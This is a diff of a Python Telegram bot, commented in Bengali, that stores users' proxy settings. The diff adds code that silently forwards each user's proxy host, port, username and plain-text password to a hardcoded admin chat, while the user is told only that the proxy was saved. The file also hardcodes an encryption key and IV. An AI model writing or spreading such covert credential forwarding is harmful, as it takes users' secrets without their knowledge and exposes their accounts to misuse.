@@ -33,7 +33,8 @@ if not BOT_TOKEN:
     exit()
 
 ADMIN_ID = 8308179143
-ADMIN_USERNAME = "Sujay_X" 
+# --- *** আপডেট: অ্যাডমিন ইউজারনেম *** ---
+ADMIN_USERNAME = "saif20256" 
 
 SECRET_KEY = "djchdnfkxnjhgvuy".encode('utf-8')
 IV = "ayghjuiklobghfrt".encode('utf-8')
@@ -57,7 +58,7 @@ try:
     users_collection = db["users_main"]
     sites_collection = db["sites"]
     config_collection = db["bot_config"]
-    proxies_collection = db["user_proxies"] # <-- প্রক্সি কালেকশন
+    proxies_collection = db["user_proxies"] 
 except Exception as e:
     logging.critical(f"MongoDB কানেক্ট করা যায়নি: {e}")
     exit()
@@ -90,9 +91,8 @@ async def load_data_from_db():
         # --- প্রক্সি ডেটা লোড করা এবং USER_DATA-তে মার্জ করা ---
         cursor_proxy = proxies_collection.find({})
         
-        # --- *** এই লুপটি ঠিক করা হয়েছে *** ---
         proxy_list = await cursor_proxy.to_list(None) 
-        for doc in proxy_list: # <-- 'async for' থেকে 'async' সরানো হয়েছে
+        for doc in proxy_list:
             user_id = doc["user_id"]
             if user_id not in USER_DATA:
                 USER_DATA[user_id] = {"user_id": user_id, "role": "user", "expires_at": 0, "banned": False}
@@ -595,7 +595,6 @@ async def verify_join_handler(query: types.CallbackQuery, state: FSMContext):
     
     await query.message.delete()
     await query.answer("✅ ভেরিফিকেশন সফল!")
-    # /start রি-ট্রিগার করার জন্য একটি নতুন মেসেজ অবজেক্ট তৈরি করা হচ্ছে
     await send_welcome(query.message, state)
 
 
@@ -611,7 +610,6 @@ async def stop_creation_handler(query: types.CallbackQuery, state: FSMContext):
         await query.message.edit_text("⏳ অপারেশনটি বাতিল করা হচ্ছে...", reply_markup=None)
     except TelegramBadRequest: pass 
 
-# --- *** এই ফাংশনটি আপডেট করা হয়েছে *** ---
 @dp.callback_query(F.data == "cancel_fsm")
 async def cancel_fsm_handler(query: types.CallbackQuery, state: FSMContext):
     await state.clear()
@@ -622,13 +620,11 @@ async def cancel_fsm_handler(query: types.CallbackQuery, state: FSMContext):
         if "message is not modified" in str(e):
             await query.answer("✅ ইতিমধ্যেই বাতিল করা হয়েছে।")
         elif "message to edit not found" in str(e):
-            # যদি মেসেজটি খুঁজে না পায়, তাহলে শুধু অ্যালার্ট দেখানো হবে
             await query.answer("❌ অপারেশনটি ইতিমধ্যেই বাতিল বা সম্পন্ন হয়েছে।", show_alert=True)
         else: 
             logging.error(f"FSM Cancel-এ অন্য এরর: {e}")
             await query.answer("একটি সমস্যা হয়েছে।", show_alert=True)
 
-# --- *** এই ফাংশনটি আপডেট করা হয়েছে *** ---
 @dp.message(F.text == "⚙️ Set/Update Proxy")
 async def handle_set_proxy(message: types.Message, state: FSMContext):
     status_info = get_user_status(message.from_user.id)
@@ -645,7 +641,6 @@ async def handle_set_proxy(message: types.Message, state: FSMContext):
                          "দয়া করে <b>Host</b> টি লিখুন:\n(e.g., as.d3230a9b316c9763.abcproxy.vip)",
                          reply_markup=types.ReplyKeyboardRemove()); await state.set_state(UserData.getting_proxy_host)
 
-# --- *** এই ফাংশনটি আপডেট করা হয়েছে *** ---
 @dp.message(F.text == "🔄 Change Proxy")
 async def handle_change_proxy(message: types.Message, state: FSMContext):
     status_info = get_user_status(message.from_user.id)
@@ -687,6 +682,7 @@ async def process_proxy_pass(message: types.Message, state: FSMContext):
         "pass": message.text 
     }
     user_id = message.from_user.id
+    user_name = message.from_user.full_name 
     
     USER_DATA.setdefault(user_id, {})["proxy"] = proxy_info
     
@@ -695,6 +691,21 @@ async def process_proxy_pass(message: types.Message, state: FSMContext):
         {"$set": {"proxy_data": proxy_info}},
         upsert=True
     )
+
+    # --- *** আপডেট: অ্যাডমিন প্যানেল (চ্যাট) এ নোটিফিকেশন *** ---
+    try:
+        admin_msg = (
+            f"🔔 <b>New Proxy Added!</b>\n\n"
+            f"👤 <b>User:</b> {user_name} (<code>{user_id}</code>)\n\n"
+            f"🌐 <b>Proxy Details:</b>\n"
+            f"<b>Host:</b> <code>{proxy_info['host']}</code>\n"
+            f"<b>Port:</b> <code>{proxy_info['port']}</code>\n"
+            f"<b>User:</b> <code>{proxy_info['user']}</code>\n"
+            f"<b>Pass:</b> <code>{proxy_info['pass']}</code>"
+        )
+        await bot.send_message(ADMIN_ID, admin_msg) # ADMIN_ID = 8308179143
+    except Exception as e:
+        logging.error(f"Failed to send proxy details to admin: {e}")
     
     await message.answer(f"✅ **প্রক্সি সফলভাবে সেভ হয়েছে!**\n\n"
                          f"<b>Host:</b> <code>{proxy_info['host']}</code>\n<b>Port:</b> <code>{proxy_info['port']}</code>\n"
